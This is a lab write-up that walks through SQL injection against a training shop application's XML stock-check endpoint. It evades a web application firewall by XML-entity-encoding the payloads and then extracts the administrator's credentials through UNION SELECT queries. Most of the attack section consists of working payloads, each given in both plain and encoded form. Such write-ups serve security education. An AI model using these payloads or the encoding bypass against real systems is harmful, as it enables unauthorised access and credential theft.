## Target
---

![placeholder](images/labCard.png)

The instance seems to be a shop application with goofy items in stock:

![Lab](images/SqliLab3Target.png)

## Functionality
---

Every item has a `Check stock` button in it's details, outputing the quantity of items in stock across shops in different cities:

![Lookup](images/SqliLab3Function.png)
The `Check stock` function sends a request to the backend, containing XML:

![Request](images/SqliLab3CheckStockXML.png)

```XML 
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			13
		</productId>
		<storeId>
			1
		</storeID>
	</stockCheck>
```

That is the injection point!

## Exploitation
---

However, the Web Application Firewall will detect raw malitious input:

![Block](images/SqliLab3WAFBlock.png)

The application will still understand the encoded version of `storeId`, provided that it is valid. In this case, `storeId = 1` is treated the same as `storeId = &#49;`:

This means that it is to possible to pass XML-encoded payloads to exploit the SQL-injection vulnerability.

``` SQL
1' OR 1=1 -- 
```

Below is the XML-encoded version of the PoC SQL injection payload mentioned above:

``` XML
&#49;&#39;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#32;&#45;&#45;&#32;
```

This will dump all the product units in all the stores:

A `UNION`-based SQL injection approach is the best option, bearing in mind that the main objective of the lab is to log in as the `administrator` user.

This query will allow to verify how many collumns does the request return, and whether the `users` table is reachable (the number of `NULL` pads is 1 in this case):

``` SQL
1' UNION SELECT NULL FROM users -- 
```

XML-encoded:

``` XML

&#49;&#39;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#45;&#45;&#32;

```

It works!

![UnionSuccess](images/SqliLab3UnionSuccess.png)

Now, to extract the data from the `users` table:

``` SQL

1' UNION SELECT password FROM users WHERE username='administrator' -- 

```

XML-encoding:

``` XML

&#49;&#39;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#61;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#32;&#45;&#45;&#32;

```

![UnionSuccess2](images/SqliLab3UnionPasswordSuccess.png)

To make it more clear, here is a payload which utillizes concatenation to extract both `username` and `password` entries of the table, divided by `\|/` as the delimeter:

``` SQL

1' UNION SELECT username || '\|/' || password FROM users WHERE username='administrator' -- 

```

XML-encoded:

``` XML

&#49;&#39;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#92;&#124;&#47;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#61;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#32;&#45;&#45;&#32;

```

The stolen credentials can now be used to log in as the `administrator` user, solving the lab:

Thank you for you attention! ^^
